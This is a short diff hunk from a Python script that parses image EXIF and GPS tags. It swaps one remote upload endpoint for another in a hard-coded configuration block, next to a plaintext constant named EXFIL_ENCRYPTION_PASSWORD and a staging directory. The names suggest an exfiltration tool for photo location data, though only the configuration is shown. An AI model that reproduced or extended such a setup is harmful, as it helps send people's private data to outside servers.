@@ -16,7 +16,7 @@ from PIL import Image
 from PIL.ExifTags import TAGS, GPSTAGS
 
 # === CONFIGURATION (HARD-CODED) === #
-UPLOAD_ENDPOINT = "https://mazlabz-terminal.vercel.app/api/upload"
+UPLOAD_ENDPOINT = "https://mazlabz-terminal-894383524313.us-central1.run.app/api/upload"
 EXFIL_ENCRYPTION_PASSWORD = "n1ghtcr0wn"
 MAX_ARCHIVE_SIZE_MB = 15
 STAGING_DIR = "/opt/mazlabz/uploads"
